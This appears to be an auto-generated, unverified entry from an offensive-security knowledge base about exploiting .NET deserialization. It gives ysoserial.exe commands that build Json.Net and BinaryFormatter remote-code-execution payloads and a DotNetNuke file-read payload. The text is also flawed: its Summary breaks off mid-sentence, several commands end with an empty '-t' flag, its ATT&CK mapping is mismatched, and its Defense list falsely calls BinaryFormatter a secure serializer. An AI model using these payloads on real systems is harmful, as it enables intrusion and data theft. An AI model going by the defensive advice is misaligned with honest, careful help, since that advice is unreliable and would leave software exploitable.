---
id: 699d664e-bb10-434e-a6dc-51212aaf5d91
name: .NET Serialization Tools Exploitation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:59.098095+00:00'
updated_at: '2023-04-06T03:55:59.119829+00:00'
tactics:
- '[[Exfiltration|TA0010 - Exfiltration]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Automated Exfiltration|T1020 - Automated Exfiltration]]'
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
sub_techniques:
- '[[Traffic Duplication|T1020.001 - Traffic Duplication]]'
tags:
- '[[.NET Serialization]]'
- '[[Tools]]'
commands:
- '[[Generate base64 encoded payload using ysoserial.exe]]'
- '[[Generate Json.Net payload from WindowsIdentity gadget]]'
- '[[Generate malicious payload using ysoserial.exe]]'
- '[[Read win.ini file using DotNetNuke payload]]'
---

# .NET Serialization Tools Exploitation

## Summary

.NET serialization is a process of converting an object into a stream of bytes that can be stored or transmitted. Attackers can exploit .NET serialization vulnerabilities to execute code remotely. The exploitation can be automated using various tools like ysoserial.exe, which is a popular tool for 

## Description

# Description

.NET serialization is a process of converting an object into a stream of bytes that can be stored or transmitted. Attackers can exploit .NET serialization vulnerabilities to execute code remotely. The exploitation can be automated using various tools like ysoserial.exe, which is a popular tool for generating payloads. An attacker can use ysoserial.exe to generate a payload and then send it to the target system using different protocols. Once the payload is deserialized, it can execute code on the target system. This technique can be used to achieve Defense Evasion and Automated Exfiltration. A successful exploitation can result in the attacker gaining unauthorized access to the system, stealing sensitive data, and executing arbitrary code.

## Requirements

1. Access to the target system

1. Knowledge of .NET Serialization vulnerabilities

1. ysoserial.exe tool

## Defense

1. Implement input validation to prevent malicious input from being deserialized

1. Use a secure serialization method like BinaryFormatter instead of JSON.NET

1. Implement network segmentation to reduce the attack surface

## Objectives

1. Execute code remotely on the target system

1. Achieve Defense Evasion and Automated Exfiltration

1. Gain unauthorized access to the system

1. Steal sensitive data

# Instructions

1. Replace my_long_cmd.txt with the path to the file containing the command to be executed on the target system.

**Code**: [[$ cat my_long_cmd.txt | ysoserial.exe -o raw -g Wi]]

> -o: Output format
-g: Gadget type
-f: Formatter type
-s: Silent mode

**Command** ([[Generate Json.Net payload from WindowsIdentity gadget]]):

```bash
$ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
```

2. Replace win.ini with the path to the file to be read on the target system.

**Code**: [[$ ./ysoserial.exe -p DotNetNuke -m read_file -f wi]]

> -p: Payload generator
-m: Method
-f: File to be read

**Command** ([[Read win.ini file using DotNetNuke payload]]):

```bash
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
```

3. Replace calc.exe with the command to be executed on the target system.

**Code**: [[$ ./ysoserial.exe -f Json.Net -g ObjectDataProvide]]

> -f: Formatter type
-g: Gadget type
-o: Output format
-c: Command to be executed
-t: Target OS

**Command** ([[Generate malicious payload using ysoserial.exe]]):

```bash
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
```

4. Replace calc.exe with the command to be executed on the target system.

**Code**: [[$ ./ysoserial.exe -f BinaryFormatter -g PSObject -]]

> -f: Formatter type
-g: Gadget type
-o: Output format
-c: Command to be executed
-t: Target OS

**Command** ([[Generate base64 encoded payload using ysoserial.exe]]):

```bash
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## MITRE ATT&CK Mapping

### Tactics

- [[Exfiltration|TA0010 - Exfiltration]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Automated Exfiltration|T1020 - Automated Exfiltration]]
- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]

### Sub-Techniques

- [[Traffic Duplication|T1020.001 - Traffic Duplication]]

## Commands Used

- [[Generate base64 encoded payload using ysoserial.exe]]
- [[Generate Json.Net payload from WindowsIdentity gadget]]
- [[Generate malicious payload using ysoserial.exe]]
- [[Read win.ini file using DotNetNuke payload]]

## Tags

- [[.NET Serialization]]
- [[Tools]]
